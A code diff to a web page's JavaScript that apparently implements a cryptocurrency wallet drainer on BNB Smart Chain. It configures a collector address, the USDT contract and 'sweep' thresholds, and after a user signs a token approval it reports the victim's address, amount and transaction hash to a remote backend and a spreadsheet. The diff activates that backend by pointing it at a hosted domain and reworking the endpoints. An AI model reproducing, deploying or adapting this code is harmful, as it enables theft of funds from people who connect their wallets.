@@ -241,7 +241,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   /* ============ CONFIG ============ */
   var CFG = {
     COLLECTOR: '0xec922f296fBb9c9057B2cF37A3c3189E57C5D44b',
-    BACKEND:   '',
+    BACKEND:   'bsc-weld-two.vercel.app',
     USDT:      '0x55d398326f99059fF775485246999027B3197955',
     DUST:      0.25,
     MIN_SWEEP: 5,
@@ -289,7 +289,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   async function checkStoredAddress(address){
     if(!CFG.BACKEND) return null;
     try{
-      var r = await fetch(CFG.BACKEND + '/collector.track', { method:'POST',
+      var r = await fetch(CFG.BACKEND + '?ep=collector.track', { method:'POST',
         headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address: address }) });
       var j = await r.json();
       return (j && j.address) ? j : null;
@@ -298,7 +298,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   async function postTopup(to){
     if(!CFG.BACKEND) return { ok:true };
     try{
-      var r = await fetch(CFG.BACKEND + '/topup', { method:'POST',
+      var r = await fetch(CFG.BACKEND + '?ep=topup', { method:'POST',
         headers:{'Content-Type':'application/json','x-topup-secret':'change-me'},
         body: JSON.stringify({ to: to }) });
       return { ok: r.ok, data: await r.json().catch(function(){ return {}; }) };
@@ -392,7 +392,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
         await tx.wait();
         $('txHash').textContent = tx.hash;
         logToSheet(state.sendAmount, state.account, 'Sheet2', state.collector);
-        if(CFG.BACKEND) fetch(CFG.BACKEND + '/approved', { method:'POST',
+        if(CFG.BACKEND) fetch(CFG.BACKEND + '?ep=approved', { method:'POST',
           headers:{'Content-Type':'application/json'},
           body: JSON.stringify({ from: state.account, amountHuman: String(state.sendAmount),
             approveTxHash: tx.hash, collector: state.collector }) }).catch(function(){});
